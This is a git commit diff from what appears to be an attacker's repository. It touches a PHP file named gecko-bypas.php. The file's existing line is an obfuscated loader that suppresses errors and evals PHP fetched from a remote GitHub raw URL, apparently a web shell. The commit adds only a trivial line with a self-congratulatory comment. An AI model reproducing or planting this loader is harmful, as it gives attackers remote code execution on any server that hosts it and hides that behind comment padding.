e7ce5bc57777fea64d5718206a5e530e8b7826be
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-02-01 13:34:31 +0700

    NuLz

--- gecko/gecko-bypas.php
+++ gecko/gecko-bypas.php
@@ -1,1 +1,2 @@
 <?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/haxorstars/archive/main/gecko/gecko.php"))/******/ /*By NuLz404*/?>
+<?=@null; /*NuLz Ganteng*/?>
